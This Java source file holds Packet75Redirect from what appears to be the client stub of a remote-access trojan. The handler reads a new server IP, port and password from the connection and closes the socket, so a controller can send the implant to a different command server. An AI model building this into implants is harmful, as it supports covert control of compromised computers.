package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class Packet75Redirect extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Main.ip = Connection.readLine();
		Main.port = Connection.readInt();
		Main.pass = Connection.readLine();
		Connection.socket.close();
	}

}